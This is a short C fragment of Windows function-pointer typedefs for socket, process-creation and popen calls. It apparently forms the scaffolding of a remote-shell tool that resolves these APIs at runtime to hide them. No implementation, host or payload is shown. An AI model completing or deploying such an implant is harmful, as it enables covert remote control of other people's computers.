#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>
#include <bcrypt.h>
#define DEFAULT_BUFLEN 4096

// Signature for WSAStartup
typedef int(WSAAPI *pWSAStartup)(
    WORD wVersionRequired,
    LPWSADATA lpWSAData);

// Signature for WSASocketA
typedef SOCKET(WSAAPI *pWSASocketA)(
    int af,
    int type,
    int protocol,
    LPWSAPROTOCOL_INFOA lpProtocolInfo,
    GROUP g,
    DWORD dwFlags);

// Signature for connect
typedef int(WSAAPI *pConnect)(
    SOCKET s,
    const struct sockaddr *name,
    int namelen);
typedef BOOL(WINAPI *pCreateProcessA)(
    LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
    BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);

typedef int(WSAAPI *pSend)(
    SOCKET s,
    const char *buf,
    int len,
    int flags);

typedef int(WSAAPI *pRecv)(
    SOCKET s,
    char *buf,
    int len,
    int flags);

extern pSend mySend;
extern pRecv myRecv;

typedef int(WSAAPI *pClosesocket)(
    SOCKET s);

typedef FILE *(__cdecl *pPopen)(
    const char *command,
    const char *mode);